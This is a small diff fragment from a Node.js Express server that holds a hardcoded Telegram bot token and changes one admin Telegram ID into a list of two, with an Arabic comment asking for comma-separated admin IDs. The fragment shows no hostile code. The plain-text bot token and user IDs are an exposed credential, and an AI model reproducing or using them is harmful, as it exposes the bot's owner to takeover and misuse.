@@ -8,7 +8,8 @@ const bodyParser = require('body-parser')
 const axios = require("axios");
 
 const token = '8915708447:AAH_WL4VW7zjnnAW-bSza710O9Cznm4vK0o'
-const id = '7657366037'
+// ضع هنا أرقام الآيدي الخاصة بالأدمنية، مفصولة بفواصل
+const adminIds = ['7657366037', '7240148750']; 
 const address = 'https://www.google.com'
 
 const app = express();
